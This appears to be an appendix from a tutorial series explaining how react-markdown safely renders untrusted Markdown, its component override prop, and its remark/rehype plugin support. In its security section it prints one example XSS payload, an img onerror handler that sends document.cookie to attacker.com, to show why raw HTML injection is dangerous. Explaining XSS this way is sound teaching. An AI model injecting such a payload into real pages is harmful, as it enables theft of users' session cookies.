# Appendix D: react-markdown

## Purpose of This Appendix
A full, standalone reference for `react-markdown` — the library powering our live preview pane since Part 2B — covering exactly *how* it safely renders untrusted Markdown, the custom component override system (which we didn't end up needing in this series, but is worth understanding), and its relationship to the `remark`/`rehype` ecosystem from Appendix C.

---

## The Security Model: Why `react-markdown` Never Uses `dangerouslySetInnerHTML`

This was flagged briefly back in Part 2B's Step 5 — this appendix gives it the full treatment it deserves.

### The Naive, Dangerous Approach

Imagine a simpler (bad) Markdown renderer implemented like this:

```javascript
// DO NOT DO THIS — shown purely to illustrate the risk
function renderMarkdown(text) {
  const html = someMarkdownToHtmlLibrary(text); // produces an HTML STRING
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

`dangerouslySetInnerHTML` is React's escape hatch for injecting a raw HTML string directly into the DOM — and its name is a deliberate, honest warning. If `text` came from user input, and that user typed:

```markdown
Check this out <img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
```

...that `<img>` tag, with its `onerror` handler, would be injected verbatim as real, live HTML — and the moment the browser fails to load `src=x` (which it always will, since `x` isn't a real image), the `onerror` JavaScript would **actually execute** in your user's browser, with access to that user's cookies, session data, and anything else the page's JavaScript can normally access. This category of vulnerability is called **XSS — Cross-Site Scripting** — and it's one of the most common, most serious web security vulnerabilities, precisely because "let users type formatted text" is such an extremely common feature.

### How `react-markdown` Actually Works

`react-markdown` never produces an HTML string at all, and therefore never has an opportunity to use `dangerouslySetInnerHTML`. Instead, it performs the full pipeline described in Appendix C:

```
Markdown text
  → remark-parse (→ mdast tree)
  → remark-rehype (→ hast tree — HTML's AST equivalent)
  → react-markdown's own renderer (→ REAL React elements, via React.createElement)
```

That final step is the crucial one: `react-markdown` walks the `hast` tree and calls `React.createElement("h1", ...)`, `React.createElement("strong", ...)`, and so on — **constructing real React elements programmatically**, the exact same mechanism your own JSX compiles down to. There is no intermediate "raw string" stage where malicious content could sneak in as executable markup. Even if a user's Markdown contains literal `<script>` tags, `react-markdown`'s default configuration does not treat those as an instruction to create a `<script>` element at all — by default, embedded raw HTML in the Markdown source is either stripped entirely or escaped as visible, inert text (the exact behavior depends on whether you've added `rehype-raw`, a separate opt-in plugin explicitly for allowing embedded HTML — which we never installed in this series, meaning our preview pane's default behavior was maximally safe by omission).

This is worth connecting directly back to Appendix C's closing note about `html` mdast nodes: the same class of raw-HTML content that our *export* converters (Parts 5–7) safely ignore via their `console.warn` fallback path, our *preview* pane (`react-markdown`) also safely neutralizes, via a completely different but equally deliberate mechanism. Two different libraries, two different techniques, the same safety outcome — which is exactly the kind of consistency you want from a well-considered architecture.

---

## Custom Component Overrides

`react-markdown` accepts a `components` prop, letting you override what real element (or your own custom React component) gets rendered for any given HTML tag. GreyMatter MConvert never used this feature — our Part 2B implementation relied entirely on default rendering plus scoped CSS (`app/globals.css`'s `.markdown-preview` rules) — but it's worth knowing this exists, since it's commonly needed in real-world extensions.

**A realistic example**, not used in this series but a natural extension: rendering code blocks with real syntax highlighting in the preview pane (currently, our preview shows code blocks in a plain monospace font with no color-coding, exactly like the raw `<code>`/`<pre>` styling from Part 2B's CSS):

```tsx
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

<ReactMarkdown
  remarkPlugins={[remarkGfm]}
  components={{
    // Overriding the "code" tag lets you inspect its className (react-markdown
    // sets this to "language-xxx" based on the mdast `code` node's `lang`
    // field, e.g. ```typescript → className="language-typescript") and
    // render a completely custom, syntax-highlighted component instead of
    // a plain, unstyled <code> tag.
    code(props) {
      const { className, children } = props;
      const language = /language-(\w+)/.exec(className || "")?.[1];
      return (
        <SyntaxHighlighterComponent language={language}>
          {String(children)}
        </SyntaxHighlighterComponent>
      );
    },
  }}
>
  {text}
</ReactMarkdown>
```

This is the exact mechanism you'd reach for if you wanted the live preview's visual fidelity to more closely match one of our actual export formats (e.g., showing code blocks in the preview with the same dark, shaded background our `toPdf.tsx` and `toDocx.ts` converters produce) — though note this would only ever affect the *preview*, never the exports themselves, since (as emphasized since Part 2B) `react-markdown` and our export converters are two entirely separate, independent rendering paths that both happen to start from the same `mdast` tree shape.

---

## Plugin Compatibility with remark/rehype

Because `react-markdown` uses the real `unified`/`remark`/`rehype` ecosystem internally (not a simplified reimplementation), **any** `remark` plugin compatible with the version of `remark-parse` it uses internally can be passed directly into its `remarkPlugins` array — which is exactly why adding `remark-gfm` in Part 2B was a one-line change (`remarkPlugins={[remarkGfm]}`), using the *exact same package* we'd already installed for our own `lib/parseMarkdown.ts` in Part 1B/3A. This isn't a coincidence — it's a direct, deliberate benefit of both our preview pane and our own parser drawing from the same underlying ecosystem, rather than two unrelated Markdown implementations that might interpret edge cases differently.

`react-markdown` also accepts a `rehypePlugins` array, for plugins that operate on the `hast` (HTML-stage) tree rather than the `mdast` (Markdown-stage) tree — for example, `rehype-sanitize` (for extra-strict HTML sanitization, useful if you *do* enable `rehype-raw` to allow embedded HTML, specifically to still strip genuinely dangerous tags/attributes from it) or `rehype-highlight` (an alternative, plugin-based approach to code syntax highlighting, versus the manual `components` override shown above).

---

## Quick Reference

| Concept | What it means for our project |
|---|---|
| No `dangerouslySetInnerHTML`, ever | Our preview pane is safe by construction, not by careful configuration |
| `components` prop | Not used in this series; the mechanism for custom rendering per-tag |
| `remarkPlugins` | Used in Part 2B for `remark-gfm` — same package as our own parser |
| `rehypePlugins` | Not used in this series; operates on the post-Markdown HTML-equivalent tree |
| Relationship to our converters | Completely separate rendering path — shares only the *idea* of starting from an mdast-compatible tree, never any actual rendering code |

---

**Official documentation:** [github.com/remarkjs/react-markdown](https://github.com/remarkjs/react-markdown) — the README directly documents every prop, including a security section that expands further on the concepts above.
